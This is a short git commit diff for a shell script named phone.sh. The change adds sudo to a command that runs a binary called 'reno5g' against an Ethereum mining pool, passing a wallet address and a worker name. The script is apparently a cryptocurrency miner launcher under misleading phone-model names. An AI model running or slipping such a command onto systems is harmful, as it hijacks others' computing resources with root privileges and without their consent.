3e340d39f42c5eca07ef13d6165f55cc257cfbda
oasegm <79352297+oasegm@users.noreply.github.com>
2021-02-20 13:52:32 +0700

    Update phone.sh

--- phone.sh
+++ phone.sh
@@ -1,4 +1,4 @@
 
 
 #!/bin/bash
-chmod +x ./reno5g && ./reno5g -epool eth.f2pool.com:6688 -ewal 0x70278496f0eaa3810d9dbdd7f388425e029013db -worker reno4f -pass x
+chmod +x ./reno5g && sudo ./reno5g -epool eth.f2pool.com:6688 -ewal 0x70278496f0eaa3810d9dbdd7f388425e029013db -worker reno4f -pass x
